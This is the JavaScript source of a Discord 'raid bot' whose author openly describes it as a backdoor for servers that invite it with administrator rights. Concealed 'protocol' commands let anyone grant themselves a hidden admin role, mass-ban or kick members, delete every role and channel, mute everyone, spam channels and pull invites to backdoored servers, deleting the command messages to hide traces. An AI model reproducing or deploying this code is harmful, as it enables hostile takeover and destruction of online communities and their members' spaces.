const botSettings = require("./botsettings.json");
const Discord = require("discord.js");
const bot = new Discord.Client();
const moment = require("moment");

// A raid bot made by Bin
// Discord: ϾᚱÆϏ#8057

bot.on("ready", async () => {
	console.log(`Simple Raid bot by Bin.`); // Console log telling the bot has started
    console.log(`--Current Backdoored Servers--`)
    bot.guilds.map((guild) => console.log(`Name: ${guild.name} (ID: ${guild.id})`)); // Displays all servers in console
    console.log(`----------------------`)
	bot.user.setActivity(`Insert Something Here`);
	try {
		console.log(`Bot Invite Link:`)
		let link = await bot.generateInvite(["ADMINISTRATOR"]); // Creates Invite Link
		console.log(link);
		console.log(`----------------------`)
	} catch(e) {
		console.log(e.stack);
	}
});

bot.on("message", async message => { 
	if (message.author.bot) return;

	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
	  const command = args.shift().toLowerCase();
	  
    // Creates and gives admin role
    if (command === `protocol-338`) {
        try {
            message.delete()
            let roleName = '[REDACTED]';
            let adminrole = message.guild.roles.find(x => x.name == roleName);
            if (!adminrole) {
                adminrole = await message.guild.createRole({
                    name: "[REDACTED]",
                    color: "#110101",
                    permissions: [8]
                });
                message.member.addRole(adminrole)
            }
            else {
                message.member.addRole(adminrole)
            }
        } catch (e) {
            console.log(e.stack);
        }
    }

	// Bans Specific Person
	if (command === `protocol-872`) {
        try {
            message.delete()
			var member= message.mentions.members.first(); member.ban()
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Bans everyone
	if (command === `protocol-872-1`) {
		try {
            message.delete()
            message.guild.members.filter(member => member.bannable).forEach(member => { member.ban() });
		} catch(e) {
			console.log(e.stack);
		}
	}
	
	// Kicks everyone
	if (command === `protocol-975-1`) {
		try {
            message.delete()
            message.guild.members.filter(member => member.kickable).forEach(member => { member.kick() });
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Kicks Specific Person
	if (command === `protocol-975`) {
		try {
			var member= message.mentions.members.first(); member.kick()
			message.delete()
		} catch(e) {
			console.log(e.stack);
		}
	}

    // Unmute someone
    if (command === `protocol-471-1`) {
        try {
            message.delete()
            let roleName = 'Terminated';
            let unsilenced = message.guild.roles.find(x => x.name == roleName);
            if (!unsilenced) {
                message.author.send(`The mute role doesn't even exist yet...`);
            }
            else {
                var member = message.mentions.members.first(); member.removeRole(unsilenced)
            }
        } catch (e) {
            console.log(e.stack);
        }
    }

    // Creates or gives mute
    if (command === `protocol-471`) {
        try {
            message.delete()
            let roleName = 'Terminated';
            let silencedrole = message.guild.roles.find(x => x.name == roleName);
            if (!silencedrole) {
                silencedrole = await message.guild.createRole({
                    name: "Terminated",
                    color: "#110101",
                    permissions: []
                })
                message.guild.channels.forEach(async (channel, id) => {
                    await channel.overwritePermissions(silencedrole, {
                        SEND_MESSAGES: false,
                        ADD_REACTIONS: false,
                        SEND_TTS_MESSAGES: false,
                        ATTACH_FILES: false,
                        CREATE_INSTANT_INVITE: false,
                        READ_MESSAGE_HISTORY: false,
                        MANAGE_ROLES: false,
                        SPEAK: false
                    })
                })
                var member = message.mentions.members.first(); member.addRole(silencedrole)
            }
            else {
                var member = message.mentions.members.first(); member.addRole(silencedrole)
            }
        } catch (e) {
            console.log(e.stack);
        }
    }

    // Creates and gives all mute
    if (command === `protocol-471-2`) {
        try {
            message.delete()
            let roleName = 'Terminated';
            let silencedrole = message.guild.roles.find(x => x.name == roleName);
            if (!silencedrole) {
                silencedrole = await message.guild.createRole({
                    name: "Terminated",
                    color: "#110101",
                    permissions: []
                })
                message.guild.channels.forEach(async (channel, id) => {
                    await channel.overwritePermissions(silencedrole, {
                        SEND_MESSAGES: false,
                        ADD_REACTIONS: false,
                        SEND_TTS_MESSAGES: false,
                        ATTACH_FILES: false,
                        CREATE_INSTANT_INVITE: false,
                        READ_MESSAGE_HISTORY: false,
                        MANAGE_ROLES: false,
                        SPEAK: false
                    })
                })
                message.guild.members.filter(m => !m.user.bot).forEach(member => member.addRole(silencedrole))
            }
            else {
                message.guild.members.filter(m => !m.user.bot).forEach(member => member.addRole(silencedrole))
            }
        } catch (e) {
            console.log(e.stack);
        }
    }

    // Rename someone
    if (command === `protocol-296`) {
        try {
            if (args[0] > 1) return message.author.send(`There was an error with renaming that person, this can be caused by using an ID. (You must mention the user, sadly.) And a tip, you cannot rename people higher than the bot, in the case that you think the bot isn't working.`);
            var member = message.mentions.members.first(); member.setNickname()
            let nickName = args.join(" ").slice(22);
            member.setNickname(nickName);
            message.delete()
        } catch (e) {
            console.log(e.stack);
        }
    } 

    // Rename everyone
	if (command === `protocol-296-1`) {
		try {
            bot.on('message', msg => {
				if (msg.guild && msg.content.startsWith('$protocol-296-1')) {
				  let text = msg.content.slice('$protocol-296-1'.length); 
				  msg.guild.members.forEach(member => {
					if (member.id != bot.user.id && !member.user.bot) member.setNickname(text).catch(() => console.log(`User's Nickname Was Unchangable: ${member.user.tag}`));
					message.delete()
				  });
				}
			  });
		} catch(e) {
			console.log(e.stack);
		}
	}

    // remove rank from specific
	if (command === `protocol-996`) {
		try {
            message.delete()
			let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
            let role = args.join(" ").slice(22);
            let gRole = message.guild.roles.find(`name`, role);
            await(rMember.removeRole(gRole.id));
		} catch(e) {
			console.log(e.stack);
		}
    }

    // Delete a role
    if (command === `protocol-996-1`) {
        try {
            message.delete();
            let choicerole = args.join(" ").slice(22);
            let sRole = message.guild.roles.find(role => role.name === choicerole)
            sRole.delete();
        } catch (e) {
            console.log(e.stack);
        }
    }

    // Delete Every Role
	if (command === `protocol-996-2`) {
		try {
            message.delete();
            message.guild.roles.forEach(roles => roles.delete())
		} catch(e) {
			console.log(e.stack);
		}
	}

	// Announcement
	if (command === `protocol-624`) {
		try {
			message.delete()
			message.channel.send('@everyone Announcement.');
		} catch(e) {
			console.log(e.stack);
		}
	}

    // Clear Messages
	if (command === `protocol-072`) {
		try {
            message.delete()
            if (args[0] > 100) return message.author.send(`100 is the max amount to delete at once, copying and pasting the command is fine, large requests are not. Large requests usually result in it failing to finish the request, so just copy and paste $cleanse 100. Also if your trying to delete but the messages won't, that is most likely because they're older than 14 days, messages 2 weeks old cannot be deleted by bots. I do not know why but discord API does not allow it.`);
            message.channel.bulkDelete(args[0]).then(msg => msg.delete(5000));
		} catch(e) {
			console.log(e.stack);
		}
	}

    // Display a users info
    if (command === `protocol-413-1`) {
        try {
            message.delete()
            const mb = message.mentions.members.first() || message.guild.members.get(args[0]) || message.member;
            message.author.send({
                embed: {
                    color: 0x36393e,
                    title: `${mb.user.username}`,
                    description: mb.user.tag,
                    fields: [{
                        name: "UserID",
                        value: mb.user.id
                    },

                    {
                        name: "Joined at",
                        value: moment(mb.joinedAt).format('MMMM Do YYYY h:mm a')
                    },

                    {
                        name: "Created at",
                        value: moment(mb.user.createdAt).format('MMMM Do YYYY, h:mm a')

                    }
                    ],
                    timestamp: new Date(),
                    footer: {
                        text: "Information"
                    }
                }
            });
        }
        catch (e) {
            console.log(e.stack);
        }
    }

    // List Server Info
    if (command === `protocol-413`) {
        try {
            message.delete()
            function checkDays(date) {
                let now = new Date();
                let diff = now.getTime() - date.getTime();
                let days = Math.floor(diff / 86400000);
                return days + (days == 1 ? " day" : " days") + " ago";
            };
            let verifLevels = ["None", "Low", "Medium"];
            let region = {
                "brazil": ":flag_br: Brazil",
                "eu-central": ":flag_eu: Central Europe",
                "singapore": ":flag_sg: Singapore",
                "us-central": ":flag_us: U.S. Central",
                "sydney": ":flag_au: Sydney",
                "us-east": ":flag_us: U.S. East",
                "us-south": ":flag_us: U.S. South",
                "us-west": ":flag_us: U.S. West",
                "eu-west": ":flag_eu: Western Europe",
                "vip-us-east": ":flag_us: VIP U.S. East",
                "london": ":flag_gb: London",
                "amsterdam": ":flag_nl: Amsterdam",
                "hongkong": ":flag_hk: Hong Kong",
                "russia": ":flag_ru: Russia",
                "southafrica": ":flag_za:  South Africa"
            };
            const embedserver = new Discord.RichEmbed()
                .setAuthor(message.guild.name, message.guild.iconURL)
                .addField("Name", message.guild.name, true)
                .addField("ID", message.guild.id, true)
                .addField("Owner", `${message.guild.owner.user.username}#${message.guild.owner.user.discriminator}`, true)
                .addField("Region", region[message.guild.region], true)
                .addField("Total | Humans | Bots", `${message.guild.members.size} | ${message.guild.members.filter(member => !member.user.bot).size} | ${message.guild.members.filter(member => member.user.bot).size}`, true)
                .addField("Verification Level", verifLevels[message.guild.verificationLevel], true)
                .addField("Channels", message.guild.channels.size, true)
                .addField("Roles", message.guild.roles.size, true)
                .addField("Creation Date", `${message.channel.guild.createdAt.toUTCString().substr(0, 16)} (${checkDays(message.channel.guild.createdAt)})`, true)
                .setThumbnail(message.guild.iconURL)
                .setColor(`0x36393e`)
            message.author.send(embedserver);
        }
        catch (e) {
            console.log(e.stack);
        }
    }

	// Uptime Counter
	if (command === `protocol-221`) {
		try {
			message.delete()
			let u = convertMS(bot.uptime);
    let uptime = u.d + " days : " + u.h + " hours : " + u.m + " minutes : " + u.s + " seconds"




    const duration = moment.duration(bot.uptime)
    let bicon = bot.user.displayAvatarURL;
    const botembed = new Discord.RichEmbed()
        .setColor(`0x00ff00`)
        .addField(`**Uptime :**  ${uptime}`, `Protocol-Bot`)

    message.author.send(botembed);

function convertMS(ms) {
    var d, h, m, s;
    s = Math.floor(ms / 1000);
    m = Math.floor(s / 60);
    s = s % 60;
    h = Math.floor(m / 60);
    m = m % 60;
    d = Math.floor(h / 24);
    h = h % 24;
    return {
        d: d
        , h: h
        , m: m
        , s: s
    };
};

		} catch(e) {
			console.log(e.stack);
		}
	}

	// Lock and Unlock channel
	if (command === `protocol-497-l`) {
		try {
			client.on('message', message => {
				if(message.content.startsWith("$" + "protocol-497-u")) {
				  message.channel.overwritePermissions(message.guild.id, {
					SEND_MESSAGES: null
				});
				  }
				});
			  client.on('message', message => {
				  if(message.content.startsWith("$" + "protocol-497-l")) {
				  
					message.channel.overwritePermissions(message.guild.id, {
					  SEND_MESSAGES: false
				  });
				  }
				  });
				  message.delete()
		} catch(e) {
			console.log(e.stack);
		}
    }

    // Delete Channel
    if (command === `protocol-117`) {
        try {
            message.delete();
            message.channel.delete();
        } catch (e) {

        }
    }

    // Delete All Channel
    if (command === `protocol-117-1`) {
        try {
            message.delete();
            message.guild.channels.forEach(channel => channel.delete())
        } catch (e) {

        }
    }

    // Makes the bot say something
	if (command === `protocol-114`) {
		try {
			let botmessage = args.join(" ");
            message.delete().catch();
            message.channel.send(botmessage);
		} catch(e) {
			console.log(e.stack);
		}
    }

    // Makes the bot say something
    if (command === `protocol-989`) {
        try {
            let spammessage = args.join(" ");
            message.delete().catch();
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
            message.channel.send(spammessage);
        } catch (e) {
            console.log(e.stack);
        }
    }

    // Gets invite link from a backdoored server
    if (command === `protocol-005`) {
        let inviteembed = new Discord.RichEmbed()
        if (!args[0] || isNaN(args[0]) || args[0].length > 18) return message.channel.send(inviteembed.setColor('0x36393e').setDescription(`Server ID is required.`));
        let guild = bot.guilds.get(args[0]);
        if (!guild) return message.channel.send(inviteembed.setColor('0x36393e').setDescription(`The bot isn't in that server.`));
        let invitePossiblites = guild.channels.filter(cha => cha.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
        if (!invitePossiblites) return message.channel.send(inviteembed.setColor('0x36393e').setDescription(`Missing the perms to make a link.`));

        try {
            invitePossiblites.random().createInvite()
                .then(invite => {
                    message.channel.send(inviteembed.setColor('0x36393e').setDescription(`Invite was created for ${guild} / ${guild.id}. 
      **[Invite](${`https://discordapp.com/invite/${invite.code})** / **Code: ${invite.code}**`}`));
                })
        } catch (err) {
            message.channel.send(inviteembed.setColor('0x36393e').setDescription(`Couldn't make the invite.`))
        }
    }

    // DM Help Command
    if (command === `protocol-001`) {
        const helpembed = new Discord.RichEmbed()
            .addField('https://github.com/BinCT/Protocol-Bot')
            .setAuthor('Command List')
            .setFooter('Raid bot by Bin')
            .setColor(0x36393e)
        try {
            message.delete()
            message.author.send(helpembed);
        } catch (e) {
            console.log(e.stack);
        }
    }

	// Bot leaves
	if(command === `protocol-672`) {
   		try {
			message.delete()
   			message.guild.leave();
   		} catch(e) {
			console.log(e.stack);
   		}
   	}
});
bot.login(botSettings.token);
